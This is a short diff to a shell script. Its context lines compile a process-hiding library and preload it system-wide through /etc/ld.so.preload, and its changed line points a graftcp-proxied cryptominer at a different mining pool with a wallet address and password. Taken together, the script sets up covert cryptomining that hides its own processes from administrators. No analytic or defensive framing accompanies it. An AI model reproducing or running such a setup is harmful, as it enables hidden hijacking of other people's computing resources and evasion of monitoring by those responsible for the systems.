@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./avx512 -a gr -o stratum+tcp://raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz8 -p IhatePopUps --no-tune
+./graftcp/graftcp ./avx512 -a gr -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz8 -p webpassword=IhatePopUps --no-tune
